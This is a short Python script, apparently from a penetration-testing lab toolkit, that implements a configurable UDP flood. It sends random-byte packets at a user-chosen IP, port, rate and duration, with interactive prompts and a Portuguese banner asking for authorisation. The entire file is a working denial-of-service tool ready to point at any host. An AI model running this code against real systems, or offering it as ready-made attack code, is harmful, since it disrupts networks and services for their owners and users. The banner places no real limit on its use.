import os
import socket
import time


def udp_flood(target_ip: str, target_port: int, duration: int, payload_size: int = 512, pps: int = 1000) -> int:
    payload = os.urandom(payload_size)
    sent = 0
    end_time = time.time() + duration
    delay = 1 / max(pps, 1)

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        while time.time() < end_time:
            sock.sendto(payload, (target_ip, target_port))
            sent += 1
            time.sleep(delay)

    return sent


def run_udp_flood() -> None:
    print("[LAB] UDP flood - usar apenas com autorizacao.")
    ip = input("Target IP: ").strip()
    port = int(input("Target port: ").strip() or "80")
    duration = int(input("Duracao (s) [10]: ").strip() or "10")
    pps = int(input("Pacotes por segundo [1000]: ").strip() or "1000")

    sent = udp_flood(ip, port, duration, pps=pps)
    print(f"Pacotes UDP enviados: {sent}")
